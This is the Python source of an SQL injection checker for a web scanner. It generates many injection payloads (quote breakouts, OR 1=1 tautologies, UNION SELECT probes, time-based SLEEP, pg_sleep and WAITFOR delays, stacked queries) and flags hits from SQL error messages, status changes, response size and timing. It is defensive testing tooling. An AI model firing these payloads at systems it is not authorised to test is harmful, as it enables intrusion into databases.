"""SQL Injection checker — multi-DB prefix/suffix combinator with error + time + boolean detection."""

import re
from typing import Optional, List

import httpx

from webscanner.checkers.base import BaseChecker
from webscanner.core.models import CheckResult, BaselineData


class SQLi(BaseChecker):

    name = "SQL Injection"

    def __init__(self, sleep_s: int = 5, time_margin: float = 2.0):
        self.sleep_s = sleep_s
        self.time_margin = time_margin

        self.payloads_list = self._build_payloads()

        # Error regex patterns — only real SQL errors
        self._err_patterns = [
            # MySQL / MariaDB
            re.compile(r"You have an error in your SQL syntax", re.I),
            re.compile(r"SQL syntax.*MySQL", re.I),
            re.compile(r"Warning.*\bmysql_", re.I),
            re.compile(r"Unknown column.*in.*field list", re.I),
            re.compile(r"Table '.*' doesn't exist", re.I),
            re.compile(r"MySqlException", re.I),
            # PostgreSQL
            re.compile(r"PostgreSQL.*ERROR", re.I),
            re.compile(r"syntax error at or near", re.I),
            re.compile(r'relation ".*" does not exist', re.I),
            re.compile(r"unterminated quoted string", re.I),
            # MSSQL
            re.compile(r"Unclosed quotation mark after the character string", re.I),
            re.compile(r"Incorrect syntax near", re.I),
            re.compile(r"\bODBC\b.*\bSQL Server\b", re.I),
            re.compile(r"Microsoft SQL Native Client", re.I),
            # Oracle
            re.compile(r"ORA-\d{4,5}:", re.I),
            re.compile(r"quoted string not properly terminated", re.I),
            # SQLite
            re.compile(r"SQLite.*error", re.I),
            re.compile(r"\bno such table\b", re.I),
            re.compile(r"unrecognized token", re.I),
            re.compile(r"near \".*\": syntax error", re.I),
            # ORM / Generic
            re.compile(r"PDOException", re.I),
            re.compile(r"SQLSTATE\[\w+\]", re.I),
            re.compile(r"QueryException", re.I),
            re.compile(r"HibernateQueryException", re.I),
            re.compile(r"pg_query\(\).*failed", re.I),
            re.compile(r"pg_exec\(\).*failed", re.I),
            re.compile(r"sqlite3\.OperationalError", re.I),
        ]

        # Boolean-detection: patterns that indicate successful tautology
        self._bool_patterns = [
            re.compile(r"admin", re.I),
            re.compile(r"root", re.I),
            re.compile(r"password", re.I),
        ]

    def _build_payloads(self) -> List[str]:
        """Build payloads using a combinator approach: prefix × core × suffix."""
        s = self.sleep_s
        out: list[str] = []

        # ── Closing prefixes (how to break out of the query context) ──
        prefixes = [
            "",             # no prefix (bare injection)
            "'",            # single quote
            '"',            # double quote
            "' ",           # quote + space
            '" ',           # quote + space
            ")",            # close paren
            "')",           # quote + close paren
            "'))",          # double close paren
            '") ',          # double quote close paren
            "1'",           # value + quote
            '1"',           # value + double quote
            "1)",           # value + close paren
            "1')",          # value + quote + close paren
        ]

        # ── Comment suffixes (how to ignore the rest of the query) ──
        suffixes = [
            "-- -",
            "--",
            "#",
            "/*",
            ";--",
        ]

        # ── Error-based core payloads ──
        error_cores = [
            "",             # just the prefix itself can trigger errors
            " OR 1=1",
            " AND 1=1",
            " OR '1'='1",
            ' OR "1"="1',
            " ORDER BY 1",
            " ORDER BY 100",
            " UNION SELECT NULL",
            " UNION SELECT NULL,NULL",
            " UNION SELECT NULL,NULL,NULL",
            " GROUP BY 1",
            " HAVING 1=1",
        ]

        # ── Boolean-based core payloads ──
        bool_cores = [
            " OR 1=1",
            " OR 17-7=10",
            " OR 2>1",
            " AND 1=1",
            " AND 2>1",
        ]

        # ── Time-based cores per DB engine ──
        time_cores = {
            "mysql": [
                f" OR SLEEP({s})",
                f" AND SLEEP({s})",
                f" AND IF(1=1,SLEEP({s}),0)",
                f" AND (SELECT SLEEP({s}))",
                f" AND BENCHMARK(10000000,SHA1('test'))",
            ],
            "postgresql": [
                f" OR pg_sleep({s})",
                f" AND pg_sleep({s})",
                f"; SELECT pg_sleep({s})",
                f" AND (SELECT pg_sleep({s}))",
            ],
            "mssql": [
                f"; WAITFOR DELAY '0:0:{s}'",
                f" AND 1=(SELECT 1 FROM (SELECT SLEEP({s}))a)",
            ],
            "oracle": [
                f" AND DBMS_LOCK.SLEEP({s})",
                f" AND UTL_INADDR.GET_HOST_ADDRESS('sleep{s}.example.com')",
            ],
            "sqlite": [
                " AND randomblob(200000000)",
                " AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
            ],
        }

        # ── 1. Pure error probes (just closing chars) ──
        for p in prefixes:
            if p:  # skip empty prefix for pure probes
                out.append(p)

        # ── 2. Error-based: prefix × core × suffix ──
        for p in prefixes:
            for core in error_cores:
                if not core:
                    continue
                for suf in suffixes:
                    out.append(f"{p}{core}{suf}")

        # ── 3. Boolean-based: prefix × core × suffix ──
        for p in prefixes:
            for core in bool_cores:
                for suf in suffixes:
                    out.append(f"{p}{core}{suf}")

        # ── 4. Time-based: prefix × engine_core × suffix ──
        for p in ["'", '"', "')", ""]:
            for engine_cores in time_cores.values():
                for core in engine_cores:
                    for suf in suffixes[:2]:  # -- - and -- only to reduce count
                        out.append(f"{p}{core}{suf}")

        # ── 5. Stacked queries ──
        stacked = [
            f"'; SELECT SLEEP({s})-- -",
            f'"; SELECT SLEEP({s})-- -',
            f"'; SELECT pg_sleep({s})-- -",
            f"'; WAITFOR DELAY '0:0:{s}'-- -",
        ]
        out.extend(stacked)

        # Deduplicate preserving order
        seen = set()
        unique = []
        for p in out:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique

    def get_payloads(self) -> List[str]:
        return self.payloads_list

    def check(self, baseline: BaselineData, response: httpx.Response, payload: str) -> Optional[CheckResult]:
        body = response.text or ""

        # ── 1. Error-based (differential): error NOT in baseline, YES in injected ──
        for rx in self._err_patterns:
            if rx.search(body) and not rx.search(baseline.body):
                return CheckResult(
                    vuln_name=self.name,
                    severity="high",
                    confidence="confirmed",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"SQL error: {rx.pattern[:60]}",
                )

        # ── 2. Status-code flip (200 → 500) ──
        if baseline.status_code < 400 and response.status_code >= 500:
            return CheckResult(
                vuln_name=self.name,
                severity="high",
                confidence="tentative",
                location="", param="", payload=payload,
                status_code=response.status_code,
                evidence=f"Status flip {baseline.status_code} → {response.status_code}",
            )

        # ── 3. Boolean-based (differential body length) ──
        if baseline.body_length > 0:
            diff_ratio = abs(len(body) - baseline.body_length) / baseline.body_length
            # Significant content change with boolean payload → suspicious
            is_bool_payload = any(kw in payload.upper() for kw in ["OR 1=1", "OR 17-7=10", "OR 2>1"])
            if is_bool_payload and diff_ratio > 0.5 and response.status_code == 200:
                return CheckResult(
                    vuln_name=self.name,
                    severity="high",
                    confidence="tentative",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"Boolean: body size changed {baseline.body_length}→{len(body)} ({diff_ratio:.0%})",
                )

        # ── 4. Time-based (differential) ──
        try:
            elapsed = response.elapsed.total_seconds()
            threshold = baseline.elapsed + self.sleep_s - self.time_margin
            if threshold > 0 and elapsed >= threshold:
                return CheckResult(
                    vuln_name=self.name,
                    severity="high",
                    confidence="tentative",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"Time: baseline={baseline.elapsed:.2f}s, injected={elapsed:.2f}s",
                )
        except Exception:
            pass

        return None
